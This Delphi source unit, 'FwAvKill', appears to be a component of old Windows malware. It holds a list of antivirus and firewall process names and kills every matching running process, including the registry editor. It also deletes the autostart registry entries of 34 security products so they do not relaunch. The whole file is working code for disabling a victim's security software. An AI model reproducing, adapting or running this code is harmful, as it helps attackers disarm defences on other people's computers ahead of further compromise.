   unit FwAvKill;

   interface
   Uses
     TlHelp32,Windows;
   Var
   HndKey: HKEY;
   AvName : array [1..34] of String =(
   'AVPCC',
   'AVPCC Service',
   'BlackIce Utility',
   'F-StopW',
   'McAfee Firewall',
   'McAfee Winguage',
   'McAfee.InstantUpdate.Monitor',
   'McAfeeVirusScanService',
   'McAfeeWebscanX',
   'McAgentExe',
   'McUpdateExe',
   'NAV Agent',
   'NAV Configuration Wizard',
   'NAV DefAlert',
   'NB Common Dialog Enhancements',
   'NB Start Menu',
   'NB Windows Patterns',
   'Norton Auto-Protect',
   'Norton eMail Protect',
   'Norton Navigator Loader',
   'Norton Program Scheduler',
   'Norton Program Scheduler Event Checker',
   'NPS Event Checker',
   'Panda Scheduler',
   'PP2000 Instaupdate',
   'PP2000 Real Time Scan',
   'PP2000 Taskbar Control',
   'SymTray - Norton SystemWorks',
   'Tiny Personal Firewall',
   'TrendMicro Antivirus',
   'TrueVector',
   'WinProxy',
   'ZoneAlarm',
   'ZoneAlarm Pro'
   );
   Const
    Processlist =
    '*ZONEALARM.EXE*WFINDV32.EXE*WEBSCANX.EXE*VSSTAT.EXE*VSHWIN32.EXE*VSECOMR.EXE*VSCAN40.EXE*VETTRAY.EXE*VET95.EXE*TDS2-NT.EXE*'+
    '*TDS2-98.EXE*TCA.EXE*TBSCAN.EXE*SWEEP95.EXE*SPHINX.EXE*SMC.EXE*SERV95.EXE*SCRSCAN.EXE*SCANPM.EXE*SCAN95.EXE*SCAN32.EXE*SAFEWEB.EXE*'+
    '*RESCUE.EXE*RAV7WIN.EXE*RAV7.EXE*PERSFW.EXE*PCFWALLICON.EXE*PCCWIN98.EXE*PAVW.EXE*PAVSCHED.EXE*PAVCL.EXE*PADMIN.EXE*OUTPOST.EXE*NVC95.EXE*'+
    '*NUPGRADE.EXE*NORMIST.EXE*NMAIN.EXE*NISUM.EXE*NAVWNT.EXE*NAVW32.EXE*NAVNT.EXE*NAVLU32.EXE*NAVAPW32.EXE*N32SCANW.EXE*MPFTRAY.EXE*MOOLIVE.EXE*'+
    '*LUALL.EXE*LOOKOUT.EXE*LOCKDOWN2000.EXE*JEDI.EXE*IOMON98.EXE*IFACE.EXE*ICSUPPNT.EXE*ICSUPP95.EXE*ICMON.EXE*ICLOADNT.EXE*ICLOAD95.EXE*IBMAVSP.EXE*'+
    '*IBMASN.EXE*IAMSERV.EXE*IAMAPP.EXE*FRW.EXE*FPROT.EXE*FP-WIN.EXE*FINDVIRU.EXE*F-STOPW.EXE*F-PROT95.EXE*F-PROT.EXE*F-AGNT95.EXE*ESPWATCH.EXE*'+
    '*ECENGINE.EXE*DVP95_0.EXE*DVP95.EXE*CLEANER3.EXE*CLEANER.EXE*CLAW95CF.EXE*CLAW95.EXE*CFINET32.EXE*CFINET.EXE*CFIAUDIT.EXE*ESAFE.EXE*'+
    '*CFIADMIN.EXE*BLACKICE.EXE*BLACKD.EXE*AVWUPD32.EXE*AVWIN95.EXE*AVSCHED32.EXE*AVPUPD.EXE*AVPTC32.EXE*AVPM.EXE*AVPDOS32.EXE*AVPCC.EXE*AVP32.EXE*AVP.EXE*'+
    '*AVNT.EXE*AVKSERV.EXE*AVGCTRL.EXE*AVE32.EXE*AVCONSOL.EXE*AUTODOWN.EXE*APVXDWIN.EXE*ANTI-TROJAN.EXE*ACKWIN32.EXE*_AVPM.EXE*_AVPCC.EXE*REGEDIT.EXE*';

   procedure KayitSil;
   procedure AvFwKill;
   function KillTask(ExeFileName: string): Integer;
   function UpperCase(const S: string): string;

   implementation
   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Function KillTask(ExeFileName: string): Integer;
   const
     PROCESS_TERMINATE = $0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     Result := 0;
     FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

     while Integer(ContinueLoop) <> 0 do
     begin
       if ((UpperCase(String(FProcessEntry32.szExeFile)) =
         UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
         UpperCase(ExeFileName))) then
         Result := Integer(TerminateProcess(
                           OpenProcess(PROCESS_TERMINATE,
                                       BOOL(0),
                                       FProcessEntry32.th32ProcessID),
                                       0));
        ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
     end;
     CloseHandle(FSnapshotHandle);
   end;
   //-------------------------------------------------------
   Procedure AvFwKill;
   var
     Proc   : TProcessEntry32;
     Snap   : THandle;
     Kelime : String;
   Begin
     Snap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS,0);
     Proc.dwSize := SizeOf(TProcessEntry32);
     Process32First(Snap,Proc);
     Repeat
      Kelime:=String(Proc.szExeFile);
      If Pos('*'+UpperCase(Kelime)+'*',ProcessList) <> 0 Then Begin Killtask(Kelime); Sleep(1000); End;
     Until (not Process32Next(Snap,Proc));
   end;
   //-------------------------------------------------------
   Procedure KayitSil;
   Var
   P: integer;
   Begin
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    'Software\Microsoft\Windows\CurrentVersion\Run',
    1,KEY_ALL_ACCESS,HndKey);

   For P:=1 To 34 Do
   RegDeleteValue(hndKEy,PChar(AvName[p]));

   RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    'Software\Microsoft\Windows\CurrentVersion\RunServices',
    1,KEY_ALL_ACCESS,HndKey);

   For p:=1 To 34 Do
   RegDeleteValue(hndKEy,PChar(AvName[p]));

   RegCloseKey(hndKey);
   End;
   //-------------------------------------------------------



   end.
